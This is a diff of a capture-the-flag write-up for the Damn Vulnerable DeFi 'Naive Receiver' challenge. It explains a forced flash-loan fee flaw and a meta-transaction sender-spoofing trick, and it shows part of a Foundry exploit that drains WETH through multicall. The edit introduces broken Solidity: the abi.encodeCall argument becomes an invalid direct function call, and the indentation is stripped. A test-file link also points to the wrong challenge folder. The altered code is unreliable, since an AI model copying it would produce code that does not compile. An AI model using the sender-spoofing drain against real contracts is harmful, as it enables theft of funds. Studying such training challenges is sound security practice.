@@ -1,6 +1,7 @@
+
 # Naive Receiver
 
-**Challenge Contracts**: https://github.com/theredguild/damn-vulnerable-defi/tree/v4.1.0/src/naive-receiver/   
+**Challenge Contracts**: https://github.com/theredguild/damn-vulnerable-defi/tree/v4.1.0/src/naive-receiver/
 **Test File**: https://github.com/theredguild/damn-vulnerable-defi/tree/v4.1.0/test/unstoppable/NaiveReceiver.t.sol
 
 ## Challenge Overview
@@ -23,7 +24,7 @@ The protocol contains two seperate issues:
 
 ### 1) Forced fee payment
 
-The user-deployed `FlashLoanReceiver` fails to check the initiator of the flash loan. Therefore, anyone can call `NaiveReceiverPool::flashLoan` and target a receiver. This will force the receiver to pay the fixed 1 WETH fee. 
+The user-deployed `FlashLoanReceiver` fails to check the initiator of the flash loan. Therefore, anyone can call `NaiveReceiverPool::flashLoan` and target a receiver. This will force the receiver to pay the fixed 1 WETH fee.
 
 ### 2) Meta-transaction sender spoofing
 
@@ -31,17 +32,17 @@ The user-deployed `FlashLoanReceiver` fails to check the initiator of the flash 
 
 ```solidity
 function _msgSender() internal view override returns (address) {
-    if (msg.sender == trustedForwarder && msg.data.length >= 20) {
-        return address(bytes20(msg.data[msg.data.length - 20:]));
-    } else {
-        return super._msgSender();
-    }
+if (msg.sender == trustedForwarder && msg.data.length >= 20) {
+return address(bytes20(msg.data[msg.data.length - 20:]));
+} else {
+return super._msgSender();
+}
 }
 ```
 
 This assumes calls from the forwarder will append the sender as the final 20 bytes of calldata. That assumption holds for a direct forwarded call, because `BasicForwarder::execute` appends the signer of the request.
 
-However, the forwarder can send a `multicall` with the sender appended on the calldata. Therefore, each batched call will not have an address appended, allowing a bad actor to append another address themselves. 
+However, the forwarder can send a `multicall` with the sender appended on the calldata. Therefore, each batched call will not have an address appended, allowing a bad actor to append another address themselves.
 
 This is a problem because `withdraw` uses the balance of `_msgSender`.
 
@@ -50,9 +51,9 @@ This is a problem because `withdraw` uses the balance of `_msgSender`.
 
 The exploit is performed in two steps.
 
-First, the user's `FlashLoanReceiver ` can be drained by forcing flash loans for 0 WETH. The pool will charge 1 WETH fee paid by the receiver until it is empty. The pool will deposit fees on behalf of the fee receiver which is the deployer.
+First, the user's `FlashLoanReceiver` can be drained by forcing flash loans for 0 WETH. The pool will charge 1 WETH fee paid by the receiver until it is empty. The pool will deposit fees on behalf of the fee receiver which is the deployer.
 
-Then, `withdraw` will send the pool's WETH balance to the recovery address when the deployer address is appended to the call. 
+Then, `withdraw` will send the pool's WETH balance to the recovery address when the deployer address is appended to the call.
 
 All of these calls are executed in a single transaction using `multicall`.
 
@@ -72,8 +73,7 @@ function test_naiveReceiver() public checkSolvedByPlayer {
     }
 
     bytes memory withdrawCall = abi.encodeCall(
-        NaiveReceiverPool.withdraw,
-        (withdrawAmount, payable(recovery))
+        NaiveReceiverPool.withdraw(withdrawAmount, payable(recovery))
     );
     withdrawCall = bytes.concat(withdrawCall, bytes20(pool.feeReceiver()));
     calls[n] = withdrawCall;
@@ -84,7 +84,7 @@ function test_naiveReceiver() public checkSolvedByPlayer {
     req.from = player;
     req.target = address(pool);
     req.value = 0;
-    req.gas = 2_000_000; 
+    req.gas = 2_000_000;
     req.nonce = forwarder.nonces(player);
     req.data = multicallData;
     req.deadline = block.timestamp + 1 days;
@@ -100,12 +100,6 @@ function test_naiveReceiver() public checkSolvedByPlayer {
 }
 ```
 
-**Challenge solved** — all WETH recovered
+## Result
 
-<img src="./img/naive-receiver-pass.png" width="800">
-
-
-
-
-
-
+WETH will be drained from the user's `FlashLoanReceiver` into the vault and the vault's WETH balance will be withdrawn to the `recovery` address.
